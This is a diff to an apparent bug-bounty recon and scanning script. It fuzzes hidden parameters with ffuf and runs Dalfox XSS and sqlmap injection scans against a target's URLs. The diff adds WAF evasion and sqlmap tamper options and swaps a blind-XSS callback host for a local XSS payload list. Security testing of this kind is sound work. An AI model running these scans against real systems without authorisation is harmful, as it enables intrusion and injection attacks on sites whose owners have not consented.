@@ -29,12 +29,12 @@ CLOUD_ENUM="/root/cloud_enum/cloud_enum.py" # Path for cloud_enum tool, Multi-cl
 SUBLIST3R="/root/Sublist3r/sublist3r.py" # Path for sublist3r tool (EDIT THIS)
 ALTDNS_WORDS="/root/altdns/words-medium.txt" # Path to altdns words permutations file (EDIT THIS)
 DNSREAPER="/root/dnsReaper/main.py" # Path to dnsrepaer tool (EDIT THIS)
-XSSHUNTER="calfcrusher.xss.ht" # XSS Hunter url for Dalfox (blind xss)
 ORALYZER="/root/Oralyzer/oralyzer.py" # Oralyzer path url tool (EDIT THIS)
 ORALYZER_PAYLOADS="/root/Oralyzer/payloads.txt" # Oralyzer payloads file
 SMUGGLER="/root/smuggler/smuggler.py" # Smuggler tool
 PARAMS="/root/params.txt" # List of params for bruteforcing GET/POST hidden params
 SQLMAP="/snap/bin/sqlmap"
+XSS_PAYLOADS="/root/xss-top500-list.txt" # List of XSS payloads
 
 SUBFINDER=$(command -v subfinder)
 AMASS=$(command -v amass)
@@ -142,11 +142,21 @@ cat live_urls_$HOST.txt | grep '?' | tee params_endpoints_urls_$HOST.txt
 # Get php endpoints
 cat live_urls_$HOST.txt | grep ".php" | cut -f1 -d"?" | sed 's:/*$::' | sort -u > php_endpoints_urls_$HOST.txt
 
+# Remove file if empty
+if [ ! -s php_endpoints_urls_$HOST.txt ]
+then
+    rm php_endpoints_urls_$HOST.txt
+fi
+
 # Save in a folder possibile hidden params to check for sql injections later
-# GET
-for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -u "${URL}?FUZZ=1" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST); done
-# POST
-for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -X POST -u "${URL}" -w PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST -d "FUZZ=1"); done
+if [ ! -z "$PARAMS" ]
+then
+    # GET
+    for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -u "${URL}?FUZZ=1" -w $PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST); done
+    
+    # POST
+    for URL in $(<php_endpoints_urls_$HOST.txt); do ($FFUF -X POST -u "${URL}" -w PARAMS -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_$HOST -d "FUZZ=1"); done
+fi
 
 # Extracts js urls
 cat live_urls_$HOST.txt | $SUBJS | tee javascript_urls_$HOST.txt
@@ -216,10 +226,10 @@ then
 fi
 
 # Running Dalfox
-$DALFOX file xss_urls_$HOST.txt -b $XSSHUNTER -S -o dalfox_PoC_$HOST.txt --skip-mining-all --skip-headless
+$DALFOX file xss_urls_$HOST.txt -S -o dalfox_PoC_$HOST.txt --custom-payload $XSS_PAYLOADS --only-custom-payload --waf-evasion
 
 # Running sqlmap
-$SQLMAP -m sqli_urls_$HOST.txt --smart --batch --random-agent --output-dir=sqlmap_$HOST
+$SQLMAP -m sqli_urls_$HOST.txt --tamper="between,randomcase" --delay=2 --threads=2 --smart --batch --random-agent --output-dir=sqlmap_$HOST
 
 # Save finish execution time
 end=`date +%s`
